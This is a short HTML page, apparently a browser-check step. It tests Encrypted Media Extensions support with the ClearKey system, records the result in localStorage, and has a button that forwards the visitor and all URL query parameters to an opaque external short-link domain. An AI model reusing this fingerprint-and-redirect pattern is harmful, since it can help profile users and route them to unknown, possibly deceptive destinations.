<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Media Key System Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212; /* Темный фон */
      color: #ffffff;
      margin: 0;
      padding: 0;
      overflow: hidden; /* Скрываем прокрутку */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      box-sizing: border-box;
    }

    .container {
      position: relative;
      z-index: 10; /* Элементы поверх фона */
      width: 90%;
      max-width: 500px;
      text-align: center;
    }

    .indicator {
      margin-bottom: 20px;
      padding: 15px;
      background-color: #1f1f1f;
      border: 1px solid #444;
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
      font-size: 16px;
      line-height: 1.4;
    }

    button {
      padding: 12px 20px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
      width: 100%;
      max-width: 300px;
    }

    button:hover {
      background-color: #0056b3;
    }

    @media (max-width: 768px) {
      .indicator {
        font-size: 14px;
        padding: 10px;
      }

      button {
        font-size: 14px;
        padding: 10px;
      }
    }

    @media (max-width: 480px) {
      .indicator {
        font-size: 12px;
        padding: 8px;
      }

      button {
        font-size: 12px;
        padding: 8px;
      }
    }

    /* Анимация фона */
    .background {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 1; /* Фон под контейнером */
    }

    .shape {
      position: absolute;
      background-color: rgba(255, 255, 255, 0.2);
      animation: fall 8s linear infinite, spin 4s linear infinite;
    }

    @keyframes fall {
      0% {
        transform: translateY(-10%) rotate(0deg);
      }
      100% {
        transform: translateY(110%) rotate(360deg);
      }
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="background" id="background"></div>

  <div class="container">
    <div class="indicator" id="indicator">Checking Media Key System Access...</div>
    <button id="redirectBtn">Переход к следующим тестам</button>
  </div>

  <script>
    const indicator = document.getElementById('indicator');
    if (navigator.requestMediaKeySystemAccess) {
      indicator.textContent = 'Protected ID запрос возможен! Продолжайте если нет всплывающего окна.';
      indicator.style.backgroundColor = '#1d4f1f';
      indicator.style.color = '#b9e2c1';
      indicator.style.borderColor = '#387d3a';
      const clearKeyOptions = [{
          initDataTypes: ["keyids", "webm"],
          audioCapabilities: [
            { contentType: 'audio/webm; codecs="opus"' },
            { contentType: 'audio/webm; codecs="vorbis"' },
          ],
          videoCapabilities: [
            { contentType: 'video/webm; codecs="vp9"' },
            { contentType: 'video/webm; codecs="vp8"' },
          ],
        }];
        navigator
        .requestMediaKeySystemAccess("org.w3.clearkey", clearKeyOptions)
        .then((keySystemAccess) => {
          window.localStorage.setItem("protectedid", "true");
        })
        .catch((err) => {
          window.localStorage.setItem("protectedid", "false");
        });
    } else {
      indicator.textContent = 'Protected ID запрос невозможен!';
      indicator.style.backgroundColor = '#4f1f1f';
      indicator.style.color = '#e2c1c1';
      indicator.style.borderColor = '#7d3a3a';
    }

    document.getElementById('redirectBtn').addEventListener('click', () => {
      const currentUrl = new URL(window.location.href);
      const redirectUrl = 'https://benioosn.com/sTpWMd'; 
      const params = currentUrl.searchParams.toString();
      window.location.href = `${redirectUrl}?${params}`;
    });

    
    const background = document.getElementById('background');
    const shapesCount = 30;

    for (let i = 0; i < shapesCount; i++) {
      const shape = document.createElement('div');
      shape.classList.add('shape');
      const size = Math.random() * 50 + 20; // Размер от 20px до 70px
      shape.style.width = `${size}px`;
      shape.style.height = `${size}px`;
      shape.style.top = `-${size}px`; // Старт выше экрана
      shape.style.left = `${Math.random() * 100}vw`; // Случайное положение по горизонтали
      shape.style.animationDuration = `${Math.random() * 5 + 5}s`; // Случайная продолжительность падения (5–10 сек)
      shape.style.animationDelay = `${Math.random() * 3}s`; // Случайная задержка перед началом
      background.appendChild(shape);
    }
  </script>
</body>
</html>
